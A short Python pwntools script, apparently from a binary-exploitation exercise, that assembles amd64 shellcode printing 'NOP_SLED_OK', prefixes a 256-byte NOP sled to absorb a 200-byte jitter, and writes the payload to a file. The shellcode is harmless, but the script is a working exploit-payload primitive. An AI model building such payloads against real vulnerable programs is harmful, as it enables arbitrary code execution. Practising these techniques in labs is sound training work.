from pwn import asm, context

# Primitiva: NOP sled. Rampa de 0x90 maior que o jitter (200) + shellcode.
context.arch = "amd64"

shellcode = asm("""
    mov eax, 1
    mov edi, 1
    lea rsi, [rip + message]
    mov edx, 12
    syscall
    mov eax, 60
    xor edi, edi
    syscall
message:
    .ascii "NOP_SLED_OK\\n"
""")
sled = b"\x90" * 256
payload = sled + shellcode
open("/home/hacker/payload.bin", "wb").write(payload)
